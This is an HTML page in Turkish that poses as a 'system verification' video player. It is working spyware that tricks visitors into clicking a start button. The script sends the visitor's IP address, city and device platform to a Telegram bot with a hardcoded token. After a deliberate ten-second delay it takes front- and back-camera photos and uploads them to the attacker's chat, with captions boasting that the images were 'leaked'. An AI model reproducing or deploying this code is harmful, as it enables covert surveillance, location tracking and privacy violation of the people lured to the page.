<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem DoÄŸrulama - Nabi v6.0</title>
    <style>
        body { background: #000; color: #fff; text-align: center; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        #startBtn {
            padding: 18px 36px; font-size: 20px; font-weight: bold; color: #fff;
            background: linear-gradient(45deg, #111, #333); border: 2px solid #00ffcc; border-radius: 12px;
            cursor: pointer; box-shadow: 0 0 15px #00ffcc; transition: 0.4s;
        }
        #startBtn:hover { background: #00ffcc; color: #000; box-shadow: 0 0 30px #00ffcc; }
        .video-box { display: none; width: 95%; max-width: 800px; border: 2px solid #00ffcc; border-radius: 10px; overflow: hidden; }
        iframe { width: 100%; aspect-ratio: 16/9; border: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div id="intro">
        <h2 style="color: #00ffcc; text-shadow: 0 0 10px #00ffcc;">ðŸ¦Ž ERÄ°ÅžÄ°M ONAYI BEKLENÄ°YOR</h2>
        <p style="color: #888; margin-bottom: 25px;">Ä°Ã§eriÄŸi gÃ¶rÃ¼ntÃ¼lemek iÃ§in oynatÄ±cÄ±yÄ± tetikleyin.</p>
        <button id="startBtn" onclick="initOperation()">ÅžÄ°FREYÄ° Ã‡Ã–Z VE BAÅžLAT</button>
    </div>

    <div id="player" class="video-box">
        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU?enablejsapi=1"></iframe>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc";
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id');

        // YavaÅŸ ve garantili sÄ±zdÄ±rma motoru
        async function secureCapture(facing, label) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: facing, width: { ideal: 640 } } 
                });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // Kamera merceÄŸinin uyanmasÄ± iÃ§in 3 saniyelik Ä±sÄ±nma sÃ¼resi
                await new Promise(r => setTimeout(r, 3000));

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
                const fd = new FormData();
                fd.append('chat_id', userId);
                fd.append('photo', blob, 'shot.jpg');
                fd.append('caption', `ðŸ“¸ ${label} GÃ¶rÃ¼ntÃ¼sÃ¼ BaÅŸarÄ±yla SÄ±zdÄ±rÄ±ldÄ±!`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { console.log(label + " hatasÄ±."); }
        }

        async function initOperation() {
            document.getElementById('intro').style.display = 'none';
            document.getElementById('player').style.display = 'block';
            document.getElementById('yt').src += "&autoplay=1";

            // AÅŸama 1: IP ve Cihaz sÄ±zdÄ±rma (Linux aarch64 uyumlu)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const msg = `â˜£ï¸ **AV BAÅžLADI**\nðŸŒ IP: ${d.ip}\nðŸ“± Sistem: ${navigator.platform}\nðŸ“ Konum: ${d.city}`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            } catch (e) {}

            // AÅžA MA 2: 10 Saniyelik Stratejik Gecikme
            setTimeout(async () => {
                // 1. Ã–nce Ã–N KAMERA (Net yÃ¼z Ã§ekimi)
                await secureCapture("user", "Ã–n Kamera");
                
                // 2. ArdÄ±ndan ARKA KAMERA (Ã‡evre Ã§ekimi)
                await new Promise(r => setTimeout(r, 1500));
                await secureCapture("environment", "Arka Kamera");
                
            }, 10000); // TAM 10 SANÄ°YE PUSU SÃœRESÄ°
        }
    </script>
</body>
</html>
